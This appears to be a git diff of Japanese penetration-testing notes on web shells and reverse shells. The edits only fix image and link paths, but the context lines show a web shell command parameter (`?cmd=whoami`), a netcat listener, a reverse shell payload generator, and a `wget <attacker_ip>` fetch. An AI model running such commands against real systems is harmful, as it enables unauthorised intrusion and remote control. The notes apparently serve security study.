@@ -39,7 +39,7 @@
 
 3. URLのcmd引数に任意のコマンドを入力する。
 	- ※ 複数クエリの場合は、`&`も使う：`index.php?path=hoge.txt&cmd=whoami`
-![[Pasted image 20230320131618.png]]
+![](../../画像ファイル/Pasted%20image%2020230320131618.png)
 $$WebShell実行例$$
 
 ---
@@ -84,7 +84,7 @@ sudo nc -lvnp 4444
 	-→ これらは、デフォルトでは<u>Windowsで動作しない</u>ため、[Reverse Shell Generator](https://www.revshells.com/)でシェルをcmdやpowershellでペイロードを生成する
 
 - Webアプリケーションにペイロードをアップロードできても、phpでは、`shell_exec`の無効化などにより、`?cmd=id`などが実行できないことがある
-	- →[WebShell](WebShell.md#トラブルシューティング)
+	- →[WebShell](#トラブルシューティング)
 
 ## 💡Tip
 
@@ -424,7 +424,7 @@ echo "Public key added successfully!";
 ```
 http://target/shell.aspx
 ```
-![[Pasted image 20260219000105.png]]
+![](../../画像ファイル/Pasted%20image%2020260219000105.png)
 - Auth Keyはスクリプトの中にある（通常woanware）
 
 #### Reverse shell 
@@ -566,5 +566,5 @@ wget <attacker_ip>/test.txt
 	- `popen`
 	- `proc_open`
 
-- 実行できないときは、攻撃ベクターを[WebShell](WebShell.md#File読み取り)に切り替える
+- 実行できないときは、攻撃ベクターを[WebShell](#File読み取り)に切り替える
 
